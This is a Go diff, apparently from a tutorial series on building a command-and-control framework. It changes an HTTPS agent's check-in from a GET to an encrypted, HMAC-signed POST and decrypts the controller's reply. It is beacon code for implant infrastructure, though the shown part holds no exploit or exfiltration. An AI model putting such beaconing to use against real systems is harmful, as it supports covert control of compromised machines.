@@ -9,6 +9,7 @@ import (
 	"io"
 	"log"
 	"net/http"
+	"strings"
 
 	"c2framework/internals/crypto"
 	"c2framework/internals/server"
@@ -50,47 +51,51 @@ func NewHTTPSAgent(serverIP string, serverPort string, sharedSecret string) *HTT
 
 // Send implements Communicator.Send for HTTPS
 func (c *HTTPSAgent) Send(ctx context.Context) (json.RawMessage, error) {
-	// Construct the URL
 	url := fmt.Sprintf("https://%s/", c.serverAddr)
 
-	// For GET requests, body is empty
-	var body []byte = nil
+	// Prepare check-in data (could include agent ID, status, etc.)
+	checkInData := map[string]interface{}{
+		"status": "active",
+	}
 
-	// Create GET request
-	req, err := http.NewRequestWithContext(ctx, "GET", url, nil)
+	plaintext, _ := json.Marshal(checkInData)
+
+	// Encrypt the payload
+	encryptedBody, err := crypto.Encrypt(plaintext, c.sharedSecret)
+	if err != nil {
+		return nil, fmt.Errorf("encrypting payload: %w", err)
+	}
+
+	// Create request with encrypted body
+	req, err := http.NewRequestWithContext(ctx, "POST", url,
+		strings.NewReader(encryptedBody))
 	if err != nil {
 		return nil, fmt.Errorf("creating request: %w", err)
 	}
 
-	// Sign the request with HMAC
-	SignRequest(req, body, c.sharedSecret)
+	req.Header.Set("Content-Type", "application/octet-stream")
 
-	// Send request
+	// Sign the request (from previous lesson)
+	SignRequest(req, []byte(encryptedBody), c.sharedSecret)
+
 	resp, err := c.client.Do(req)
 	if err != nil {
 		return nil, fmt.Errorf("sending request: %w", err)
 	}
 	defer resp.Body.Close()
 
-	// Check for authentication failure
-	if resp.StatusCode == http.StatusUnauthorized {
-		return nil, fmt.Errorf("authentication failed - check shared secret")
-	}
-
-	// Check status code
 	if resp.StatusCode != http.StatusOK {
-		respBody, _ := io.ReadAll(resp.Body)
-		return nil, fmt.Errorf("server returned status %d: %s", resp.StatusCode, respBody)
+		return nil, fmt.Errorf("server returned status %d", resp.StatusCode)
 	}
 
-	// Read response body
-	respBody, err := io.ReadAll(resp.Body)
+	// Read encrypted response
+	encryptedResponse, err := io.ReadAll(resp.Body)
 	if err != nil {
 		return nil, fmt.Errorf("reading response: %w", err)
 	}
 
-	// Decrypt the response
-	decrypted, err := crypto.Decrypt(string(respBody), c.sharedSecret)
+	// Decrypt response
+	decrypted, err := crypto.Decrypt(string(encryptedResponse), c.sharedSecret)
 	if err != nil {
 		return nil, fmt.Errorf("decrypting response: %w", err)
 	}
